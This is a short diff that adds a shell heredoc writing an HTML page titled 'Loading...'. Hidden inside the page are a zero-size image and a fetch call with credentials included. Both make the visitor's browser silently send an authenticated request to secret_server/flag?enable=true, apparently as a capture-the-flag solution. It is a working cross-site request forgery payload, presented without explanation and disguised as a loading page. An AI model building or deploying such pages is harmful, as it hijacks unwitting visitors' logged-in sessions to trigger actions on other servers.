@@ -1,0 +1,17 @@
+cat > index.html <<EOF
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+</head>
+<body>
+    <img src="http://secret_server/flag?enable=true" width="0" height="0">
+    <script>
+        fetch("http://secret_server/flag?enable=true", {
+            mode: 'no-cors',
+            credentials: 'include'
+        });
+    </script>
+</body>
+</html>
+EOF
